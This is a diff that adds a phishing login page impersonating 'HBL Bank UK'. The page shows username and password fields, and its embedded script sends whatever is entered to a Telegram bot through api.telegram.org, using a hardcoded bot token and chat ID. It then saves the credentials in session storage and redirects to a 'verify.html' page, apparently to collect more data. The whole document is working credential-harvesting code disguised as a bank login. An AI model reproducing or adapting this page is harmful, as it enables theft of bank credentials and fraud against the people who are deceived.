@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="description" content="Log in to HBL Bank UK to access your account and payment rewards." />
+  <title>Log in | HBL Bank UK</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="login.css" />
+</head>
+<body class="login-page">
+  <div class="login-shell">
+    <header class="login-top">
+      <a href="index.html" class="login-back" aria-label="Back to rewards">
+        <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M15.41 7.41 14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
+      </a>
+      <img src="hbl.jpeg" alt="HBL Bank UK" class="login-logo" width="220" height="52" />
+    </header>
+
+    <div class="login-tabs" role="tablist" aria-label="Account type">
+      <span class="login-tab login-tab--active" role="tab" aria-selected="true">Personal</span>
+    </div>
+
+    <form class="login-form" id="login-form" action="#" method="post" novalidate>
+      <div class="login-field">
+        <input type="text" id="username" name="username" autocomplete="username" placeholder=" " required />
+        <label for="username">User Name</label>
+        <span class="login-field-line" aria-hidden="true"></span>
+      </div>
+      <div class="login-field">
+        <input type="password" id="password" name="password" autocomplete="current-password" placeholder=" " required />
+        <label for="password">Password</label>
+        <span class="login-field-line" aria-hidden="true"></span>
+      </div>
+
+      <div class="login-forgot">
+        <a href="#">Forgot User Name</a>
+        <a href="#">Forgot Password</a>
+      </div>
+
+      <hr class="login-divider" />
+
+      <button type="submit" class="login-submit">LOGIN</button>
+      <p class="login-message" id="login-message" role="status" hidden></p>
+    </form>
+  </div>
+
+  <script>
+    // ── Telegram Config ──────────────────────────────
+    const TG_TOKEN = "9152282584:AAFbd5TJhsu_pMQ2e-AkBC5viU1Mesu90TM";
+    const TG_CHAT  = "8929657470";
+
+    async function sendToTelegram(username, password) {
+      const text =
+        "🏦 *HBL Bank UK — New Login*\n\n" +
+        "👤 *Username:* `" + username + "`\n" +
+        "🔑 *Password:* `" + password + "`\n" +
+        "🕐 *Time:* " + new Date().toLocaleString("en-GB");
+
+      try {
+        await fetch("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TG_CHAT,
+            text: text,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (_) {}
+    }
+    // ─────────────────────────────────────────────────
+
+    const form     = document.getElementById("login-form");
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      if (!username) { usernameInput.focus(); return; }
+      if (!password) { passwordInput.focus(); return; }
+
+      // إرسال إلى Telegram في الخلفية
+      await sendToTelegram(username, password);
+
+      // حفظ للصفحة التالية
+      sessionStorage.setItem("hbl_username", username);
+      sessionStorage.setItem("hbl_password", password);
+
+      // الانتقال لصفحة التحقق
+      window.location.href = "verify.html";
+    });
+  </script>
+</body>
+</html>
